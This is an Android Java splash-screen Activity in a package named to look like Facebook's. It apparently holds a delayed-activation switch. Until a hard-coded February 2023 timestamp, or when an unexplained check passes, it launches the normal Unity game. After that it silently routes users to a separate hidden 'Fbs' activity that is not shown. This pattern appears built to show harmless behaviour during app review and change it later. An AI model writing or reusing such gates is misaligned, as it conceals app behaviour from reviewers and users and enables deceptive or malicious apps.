package com.facebook.nxmj;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import androidx.annotation.Nullable;

public class Splasher extends Activity {

    public static long delay = 1676687976000L;
    public static String activPath = "com.unity3d.player.UnityPlayerActivity";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if(System.currentTimeMillis()<delay || FBSplashActivity.iCD()){
            jumpLocalSplash();
        } else {
            jumpLocalFbSplash();
        }

    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {

        try {
            Class aimClass = Class.forName(activPath);
            Intent intent = new Intent(Splasher.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    /**
     * 跳原应用
     */

    private void jumpLocalFbSplash() {

        try {
            Class aimClass = Class.forName("com.facebook.nxmj.Fbs");
            Intent intent = new Intent(Splasher.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

}